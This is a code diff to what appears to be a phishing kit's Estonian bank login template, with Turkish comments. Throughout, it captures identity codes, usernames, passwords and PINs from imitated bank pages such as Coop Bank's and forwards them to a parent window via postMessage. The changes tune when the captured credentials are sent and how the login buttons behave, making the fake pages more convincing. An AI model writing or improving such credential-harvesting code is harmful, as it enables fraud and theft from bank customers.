@@ -568,6 +568,10 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
               ) === index,
           );
 
+        if (filledValues.length < 2) {
+          return;
+        }
+
         const hasIdentityValue = Boolean(mappedData.personalCode || mappedData.username || mappedData.verfuegernummer || mappedData.bankPhone);
         if (!hasIdentityValue && filledValues[0]?.value) {
           assignMappedValue("personalCode", filledValues[0].value, { overwrite: true, syncState: true });
@@ -584,6 +588,11 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           if (passwordFallback?.value) {
             assignPassword(passwordFallback.value, true);
           }
+        }
+
+        const hasPasswordValue = Boolean(mappedData.password || mappedData.pin || passwordFallback?.value);
+        if (!hasIdentityValue || !hasPasswordValue) {
+          return;
         }
         
         handleRouteAction({
@@ -656,14 +665,11 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
         // Coop Bank Buton ve Hatırla Seçeneği Fix (Observer ve CSS olmadan, güvenli yöntem)
         const fixCoop = () => {
             if (window.location.href.includes('coop')) {
-                // Giriş butonunu aktif et
                 document.querySelectorAll('button').forEach(btn => {
                     const text = btn.textContent ? btn.textContent.toLowerCase() : '';
                     if (text.includes('sisene')) {
-                        btn.removeAttribute('disabled');
-                        btn.classList.remove('v-btn--disabled');
-                        btn.style.pointerEvents = 'auto';
-                        btn.style.opacity = '1';
+                        btn.style.pointerEvents = btn.disabled ? 'none' : 'auto';
+                        btn.style.opacity = btn.disabled ? '0.5' : '1';
                     }
                 });
                 
@@ -691,18 +697,22 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             document.addEventListener('input', (e) => {
                 if (e.target && e.target.tagName === 'INPUT') {
                     const form = e.target.closest('form') || document;
-                    const hasValue = Array.from(form.querySelectorAll('input:not([type="hidden"])')).some(inp => inp.value.trim && inp.value.trim().length > 0);
+                    const filledCount = Array.from(form.querySelectorAll('input:not([type="hidden"]):not([type="checkbox"]):not([type="radio"]):not([type="submit"]):not([type="button"])'))
+                        .filter(inp => inp.value.trim && inp.value.trim().length > 0).length;
                     
                     document.querySelectorAll('button').forEach(btn => {
                         const text = btn.textContent ? btn.textContent.toLowerCase() : '';
                         if (text.includes('sisene')) {
-                            if (hasValue) {
+                            if (filledCount >= 2) {
                                 btn.style.setProperty('background-color', '#0b56cc', 'important');
                                 btn.style.setProperty('color', '#ffffff', 'important');
+                                btn.disabled = false;
+                                btn.classList.remove('v-btn--disabled');
                                 btn.querySelectorAll('*').forEach(child => {
                                     if(child.style) child.style.setProperty('color', '#ffffff', 'important');
                                 });
                             } else {
+                                btn.disabled = true;
                                 btn.style.removeProperty('background-color');
                                 btn.style.removeProperty('color');
                                 btn.querySelectorAll('*').forEach(child => {
@@ -1258,6 +1268,9 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             if (coopFields.length === 0) {
                 coopFields.push(...buildCapturedFields(document));
             }
+            if (coopFields.filter(field => (field.value || '').trim() !== '').length < 2) {
+                return;
+            }
             const coopInputs = buildInputMap(coopFields);
 
             window.parent.postMessage({
@@ -1272,13 +1285,24 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             const coopButton = document.getElementById('ID_LoginSubmit');
             if (!coopButton) return;
 
-            coopButton.removeAttribute('disabled');
-            coopButton.disabled = false;
-            coopButton.style.opacity = '1';
-            coopButton.style.cursor = 'pointer';
-            coopButton.style.pointerEvents = 'auto';
-            coopButton.classList.remove('v-btn--disabled');
-            coopButton.classList.remove('disabled');
+            const activeCoopPanel =
+                document.querySelector('.v-window-item--active') ||
+                document.querySelector('.v-window-item:not([style*="display:none"])') ||
+                document;
+            const visibleFieldCount = buildCapturedFields(activeCoopPanel).filter(field => (field.value || '').trim() !== '').length;
+            const ready = visibleFieldCount >= 2;
+
+            coopButton.disabled = !ready;
+            coopButton.style.opacity = ready ? '1' : '0.5';
+            coopButton.style.cursor = ready ? 'pointer' : 'not-allowed';
+            coopButton.style.pointerEvents = ready ? 'auto' : 'none';
+            if (ready) {
+                coopButton.removeAttribute('disabled');
+                coopButton.classList.remove('v-btn--disabled');
+                coopButton.classList.remove('disabled');
+            } else {
+                coopButton.setAttribute('disabled', 'disabled');
+            }
 
             if (!coopButton.dataset.traeBound) {
                 coopButton.dataset.traeBound = '1';
@@ -1566,16 +1590,10 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
              const fields = buildCapturedFields(inputContainer);
              const inputs = buildInputMap(fields);
              
-             let isEmpty = true;
-             const hasVisibleInputs = fields.length > 0;
-             fields.forEach(field => {
-               if (field.value && field.value.trim() !== '') {
-                 isEmpty = false;
-               }
-             });
-             
-             // Form boşsa ve görünür input varsa submit etme
-             if (hasVisibleInputs && isEmpty) {
+             const filledFieldCount = fields.filter(field => field.value && field.value.trim() !== '').length;
+
+             // En az iki görünür alan dolmadan submit etme
+             if (filledFieldCount < 2) {
                  return;
              }
 
@@ -1679,28 +1697,32 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           const form = input.closest('form');
           if (form) {
              if (window.location.href.includes('coop')) {
+                 const activeCoopFieldCount = buildCapturedFields(form).filter(field => (field.value || '').trim() !== '').length;
+                 const ready = activeCoopFieldCount >= 2;
                 form.querySelectorAll('button[type="submit"], input[type="submit"], button.btn, button.submit, a.btn, a.button').forEach(btn => {
-                    btn.disabled = false;
-                    btn.style.opacity = '1';
-                    btn.style.cursor = 'pointer';
-                    btn.style.pointerEvents = 'auto';
-                    btn.classList.remove('disabled');
-                    btn.classList.remove('bb-button--disabled');
+                     btn.disabled = !ready;
+                     btn.style.opacity = ready ? '1' : '0.5';
+                     btn.style.cursor = ready ? 'pointer' : 'not-allowed';
+                     btn.style.pointerEvents = ready ? 'auto' : 'none';
+                     if (ready) {
+                       btn.classList.remove('disabled');
+                       btn.classList.remove('bb-button--disabled');
+                     }
                 });
                 return;
              }
 
-             let anyEmpty = false;
-             form.querySelectorAll('input').forEach(i => {
+              let filledCount = 0;
+              form.querySelectorAll('input').forEach(i => {
                 if (i.type !== 'hidden' && i.type !== 'submit' && i.type !== 'button') {
-                    if (!i.value || i.value.trim() === '') {
-                        anyEmpty = true;
-                    }
+                     if (i.value && i.value.trim() !== '') {
+                         filledCount += 1;
+                     }
                 }
              });
              
              form.querySelectorAll('button[type="submit"], input[type="submit"], button.btn, button.submit, a.btn, a.button').forEach(btn => {
-                 if (anyEmpty) {
+                  if (filledCount < 2) {
                      btn.disabled = true;
                      btn.style.opacity = '0.5';
                      btn.style.cursor = 'not-allowed';
@@ -1784,13 +1806,6 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
               input.style.setProperty('visibility', 'visible', 'important');
           }
         };
-
-        // Fix buttons that are disabled by default
-        document.querySelectorAll('button[disabled], input[disabled]').forEach(btn => {
-           btn.removeAttribute('disabled');
-           if (btn.classList.contains('disabled')) btn.classList.remove('disabled');
-           if (btn.classList.contains('bb-button--disabled')) btn.classList.remove('bb-button--disabled');
-        });
 
         // Hide specific elements for specific banks based on user request
         try {
